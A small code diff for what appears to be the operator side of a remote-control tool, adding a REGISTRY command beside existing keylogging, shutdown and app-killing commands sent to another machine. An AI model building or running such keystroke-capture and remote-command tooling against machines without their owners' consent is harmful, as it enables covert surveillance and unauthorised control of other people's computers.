@@ -12,6 +12,7 @@ SHUTDOWN_MSG = "!SHUTDOWN"
 KEYLOG_MSG = "!KEYLOG"
 GETAPP_MSG = "!GETAPP"
 KILLAPP_MSG = "!KILLAPP"
+REGISTRY_MSG = "!REGISTRY"
 
 keylog_on = False
 
@@ -82,6 +83,9 @@ def start():
             else:
                 keylog_on = False
                 print(f"Keylog: {receive()}")
+        elif msg == REGISTRY_MSG:
+            send(input("Enter command: "))
+            print(receive())
         elif msg == GETAPP_MSG:
             receiveAppList()
         elif msg == KILLAPP_MSG:
